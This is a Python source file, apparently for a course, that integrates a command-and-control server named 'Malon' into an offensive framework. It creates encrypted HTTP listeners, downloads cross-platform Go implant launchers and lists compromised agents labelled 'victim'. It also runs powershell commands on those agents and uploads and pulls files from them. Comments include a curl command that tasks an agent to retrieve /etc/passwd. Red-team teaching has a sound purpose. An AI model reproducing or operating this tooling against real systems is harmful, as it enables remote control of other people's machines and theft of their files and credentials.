from .. import ResourceExistsError, ResourceNotFoundError
from .. import C2, ListenerType, LauncherType, AgentType, Options, OptionDesc

import asyncio
import random
import os
import base64
import string
from typing import Iterable, Optional, Type, Dict, Any, IO
import json
import logging
logger = logging.getLogger(__name__)

import aiohttp
import requests
import io
import shlex
import base64


class MalonC2(C2):
    name = 'Malon_curso'
    description = 'Integracion propuesta'
    documentation = 'no disponible'
    registered_options = [
        OptionDesc(
            name='url',
            description='Url correspondiente a la API de administracion',
            example='http://127.0.0.1:5000',
            field_type='string',
            required=True
        ),
    ]

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self._listener_types = {
            MalonListener.name: MalonListener(
                self.options['url'],
                self
            ),
        }
        self._launcher_types = {
        MalonGenericLauncher.name:MalonGenericLauncher(self.options['url'], self),
        }

        self._agent_types = {
            'powershell': MalonAgent(self.options['url'], self),
        }

    def get_session(self) -> aiohttp.ClientSession:
        return aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False))

    async def get_listener_types(self) -> Iterable[ListenerType]:
        return self._listener_types

    async def get_launcher_types(self) -> Iterable[LauncherType]:
        return self._launcher_types

    async def get_agent_types(self) -> Iterable[LauncherType]:
        return self._agent_types

    async def is_alive(self) -> bool:
        try:
            target = self.options['url'] + '/listeners'
            async with self.get_session() as session:
                async with session.get(target) as response:
                    result = await response.json()
                    if isinstance(result,list):
                        return True
                    else:
                        raise ConnectionRefusedError(
                            'Error revisando status: {}'.format(result))
        except aiohttp.InvalidURL as er:
            raise ValueError(repr(er))
        except aiohttp.ClientError as er:
            raise ConnectionError(repr(er))


    async def retrieve_agents(self, dto: Dict[str, Any]) -> bytes:
        try:
            target = '{}/agents/'.format(self.options['url'])

            response_dto = {'agents': []}
            async with self.get_session() as session:
                async with session.get(target) as response:
                    current_agents = await response.json()
                    logger.info('current_agents: %r', current_agents)
                    for agent in current_agents:
                        new_agent = {}
                        new_agent['first_connection'] = agent['created_at']
                        new_agent['last_connection'] = agent['last_seen_at']
                        new_agent['hostname'] = agent['id'][:5]
                        new_agent['username'] = 'victim'
                        new_agent['internal_id'] = agent['id']
                        new_agent['shell_type'] = 'powershell'
                        new_agent['listener_internal_id'] = agent['listener_id']
                        new_agent['active'] = True
                        response_dto['agents'].append(new_agent)
                logger.info('response_dto: %r', response_dto)
                return response_dto
        except aiohttp.client_exceptions.ClientConnectorError as err:
            raise ConnectionError(err)

class MalonListener(ListenerType):
    name = 'malon-http-cifrado'
    description = 'conexion a traves de http cifrado'
    registered_options = [
        OptionDesc(
            name='target host',
            description='direccion a la que se debe conectar',
            example='192.168.0.14',
            field_type='string',
            required=True
        ),
        OptionDesc(
            name='target port',
            description='puerto al cual se debe conectar el agente',
            example=80,
            field_type='integer',
            required=True
        ),
        OptionDesc(
            name='bind host',
            description='interfaces en la que el listener va a ser expuesto',
            example='0.0.0.0',
            field_type='string',
            required=False
        ),
        OptionDesc(
            name='bind port',
            description='interfaces en la que el listener va a ser expuesto',
            example='0.0.0.0',
            field_type='string',
            required=False
        ),
        OptionDesc(
            name='connection interval',
            description='internvalo de tiempo que deja pasar un agente para consultar a su listener',
            example=1000,
            field_type='integer',
            required=False
        ),
    ]

    def __init__(self, url: str, _c2: MalonC2) -> None:
        self._url = url
        self._c2 = _c2

    async def create_listener(self, options: Options) -> Dict:
        logger.debug('[*] options:', options)
        bind_host = options.get('bind host', '')
        bind_port = options.get('bind port', '')
        target_host = options.get('target host', bind_host)
        target_port = options.get('target port', bind_port)
        connection_internval =  options.get('connection interval', 1000)
        if not bind_host or not bind_port :
            raise ValueError('[*] Opciones invalidas: falta opcion requerida')

        raw_key = os.urandom(16)
        sym_key = base64.b64encode(raw_key).decode('utf-8')


        listener_dict = {
            "type" : "http",
            "bind_port": bind_port,
            "bind_host": bind_host,
            "target_host": target_host,
            "target_port": target_port,
            "connection_interval_ms": connection_internval,
            "sym_key" : sym_key
        }
        logger.info("listener_dict %r", listener_dict)
        try:
            target = '{}/listeners/'.format(self._url)

            async with self._c2.get_session() as session:
                async with session.post(target, json=listener_dict) as response:
                    options = await response.json()
                    internal_id = options.pop('id')
                    response_dto = {}
                    response_dto['listener_internal_id'] = internal_id
                    response_dto['listener_options'] = await response.json()
                    return response_dto
        except aiohttp.client_exceptions.ClientConnectorError as err:
            raise ConnectionError(err)

    async def delete_listener(self, internal_id: str, options: Options) -> None:
        target = '{}/api/listeners/{}'.format(self._url, internal_id)
        async with self.get_session() as session:
            async with session.delete(target) as response:
                result = await response.text
                logger.error('[*] result: %r ', result)
                if response.ok:
                    return
                else:
                    raise ResourceNotFoundError(
                        'Error fetching listeners: {}'.format(result))

class MalonGenericLauncher(LauncherType):
    name = 'Generic compiled GO executable'
    description = 'Un ejecutable compilado cross-plataforma'
    registered_options = [
        OptionDesc(
            name='plataforma',
            description='Plataforma para compilar el binario: windows, linux, darwin',
            example='windows',
            field_type='string',
            required=True
        ),
    ]

    def __init__(self, url: str,  _c2: MalonC2) -> None:
        self._url = url
        self._c2 = _c2

    async def create_launcher(self, dto: Dict[str, Any]) -> str:
        return {}

    async def download_launcher(self, dto: Dict[str, Any]) -> IO:
        try:
            logger.info("dto: %r", dto)
            listener_id = dto.get('listener_internal_id')
            options = dto.get('launcher_options', {})
            platform = options.get('plataforma')
            target = '{}/listeners/{}/launcher/x64-{}'.format(self._url, listener_id,  platform)
            logger.info("target: %r", target)
            response_dto = {}
            async with self._c2.get_session() as session:
                async with session.get(target) as response:
                    response_dto['payload_content'] = await response.read()
                    response_dto['payload_name'] = "x64-{}".format(platform)
                    response_dto['launcher_internal_id'] = ''
                    return response_dto
        except aiohttp.client_exceptions.ClientConnectorError as err:
            raise ConnectionError(err)

class MalonAgent(AgentType):
    shell_type = 'powershell'

    def __init__(self, url: str, _c2: MalonC2) -> None:
        self._url = url
        self._c2 = _c2

    async def shell_execute(self, dto: Dict[str, Any]) -> bytes:
        """
        executes a command string on the 
           raises ValueError in case of invalid dto
           raises ConectionError in case of not be able to connect to c2 instance
           raises ResourceNotFoundError 
        dto = {'agent_internal_id':1234, 'command':'ls'}

        """
        try:
            target = '{}/agents/{}/tasks'.format(self._url, dto['agent_internal_id'])

            command_args =  shlex.split("powershell -Command '{}'".format(dto['command']))
            interact_post_data = {'type':'command', 'info':{'args': command_args, 'timeout_ms':5000}}
            response_dto = {}
            command_output_id = ''
            async with self._c2.get_session() as session:
                async with session.post(target, json=interact_post_data) as response:
                    logger.info('#RESPONSE %r', response)
                    command_response_json = await response.json()
                    command_output_id = command_response_json.get('id')
            task_status_target = '{}/agents/{}/tasks/{}/result'.format(self._url, dto['agent_internal_id'], command_output_id)
            for _ in range(40):
                async with self._c2.get_session() as session:
                    async with session.get(task_status_target) as response:
                        task_result_list = await response.json()
                        logger.info('task_result_list: %r', task_result_list)
                        for task_result in task_result_list:
                            output_encoded = task_result.get('output')
                            if output_encoded is not None:
                                logger.info('command_response_json: %r', output_encoded)
                                response_dto['content'] = base64.b64decode(output_encoded).decode('utf-8')
                                return response_dto
                        try:
                            await asyncio.sleep(1)
                        except asyncio.CancelledError:
                            pass
            else:
                raise ConnectionError('unable  to retrieve  task')
        except aiohttp.client_exceptions.ClientConnectorError as err:
            raise ConnectionError(err)

    async def upload_file(self, dto: Dict[str, Any]) -> bytes:
        """
        {'c2_type': 'Malon_curso', 'c2_options': {'url': 'http://127.0.0.1:5000'}, 'listener_type': 'malon-http-cifrado', 'listener_options': {'target host': '192.168.174.128', 'target port': '7777', 'bind host': '192.168.174.128', 'bind port': '7777', 'connection interval': '1000'}, 'listener_internal_id': '1', 'agent_internal_id': '9865526f6e772b6aa4eafc32406ef22c', 'agent_shell_type': 'powershell', 'target_directory': '/Users/criso/Desktop/', 'file_name': 'banana.txt', 'file_content': 'cHVjYXJhCg=='}
        """
        try:
            logger.info('dto: %r', dto)
            # curl localhost:5000/agents/68bf60312d85bbee7a4153909bad9906/tasks/ -d '{"type": "file", "info": {"type": "get", "file_path": "/etc/passwd"}}' -H'Content-Type: application/json'
            target = '{}/agents/{}/tasks'.format(self._url, dto['agent_internal_id'])
            interact_post_data = {"type": "file", "info": {"type": "put", "file_path": dto['target_directory']+ dto['file_name']},  "input":dto['file_content']}
            logger.debug('target: %r, data: %r', target, interact_post_data)

            response_dto = {}
            command_output_id = ''
            async with self._c2.get_session() as session:
                async with session.post(target, json=interact_post_data) as response:
                    command_response_json = await response.json()
                    command_output_id = command_response_json.get('id')

            task_status_target = '{}/agents/{}/tasks/{}/result'.format(self._url,dto['agent_internal_id'], command_output_id)
            for _ in range(40):
                async with self._c2.get_session() as session:
                    async with session.get(task_status_target) as response:
                        task_result_list = await response.json()
                        for task_result in task_result_list:
                            output_encoded = task_result.get('output')
                            if output_encoded is not None:
                                logger.info('command_response_json: %r', output_encoded)
                                response_dto['content'] = output_encoded
                                return response_dto
                        try:
                            await asyncio.sleep(1)
                        except asyncio.CancelledError:
                            pass
        except aiohttp.client_exceptions.ClientConnectorError as err:
            raise ConnectionError(err)

    async def download_file(self, dto: Dict[str, Any]) -> bytes:
            try:
                # curl localhost:5000/agents/68bf60312d85bbee7a4153909bad9906/tasks/ -d '{"type": "file", "info": {"type": "get", "file_path": "/etc/passwd"}}' -H'Content-Type: application/json'
                target = '{}/agents/{}/tasks'.format(self._url, dto['agent_internal_id'])
                interact_post_data = {"type": "file", "info": {"type": "get", "file_path": dto['file_path']}}
                logger.debug('target: %r, data: %r', target, interact_post_data)

                response_dto = {}
                command_output_id = ''
                async with self._c2.get_session() as session:
                    async with session.post(target, json=interact_post_data) as response:
                        command_response_json = await response.json()
                        command_output_id = command_response_json.get('id')

                task_status_target = '{}/agents/{}/tasks/{}/result'.format(self._url,dto['agent_internal_id'], command_output_id)
                for _ in range(40):
                    async with self._c2.get_session() as session:
                        async with session.get(task_status_target) as response:
                            task_result_list = await response.json()
                            for task_result in task_result_list:
                                output_encoded = task_result.get('output')
                                if output_encoded is not None:
                                    logger.info('command_response_json: %r', output_encoded)
                                    response_dto['content'] = output_encoded
                                    return response_dto
                            try:
                                await asyncio.sleep(1)
                            except asyncio.CancelledError:
                                pass
            except aiohttp.client_exceptions.ClientConnectorError as err:
                raise ConnectionError(err)



